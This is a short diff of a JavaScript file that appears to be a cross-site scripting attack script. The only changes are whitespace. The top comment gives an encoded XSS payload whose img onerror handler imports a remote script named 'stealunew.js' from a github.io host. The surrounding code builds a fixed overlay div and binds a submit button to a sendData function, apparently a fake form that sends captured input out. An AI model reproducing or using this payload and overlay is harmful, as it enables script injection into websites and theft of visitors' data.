@@ -1,6 +1,4 @@
 //Payload: %uff1cimg%20src=d%20onerror=import("https://vulnoob.github.io/jsfile/stealunew.js")%uff1e
-
-
 let div = document.createElement('div');
 div.style.position = 'fixed';
 div.style.top = '20%';
@@ -41,4 +39,5 @@ function sendData() {
 }
 
 document.getElementById('submitBtn').addEventListener('click', sendData);
+
 
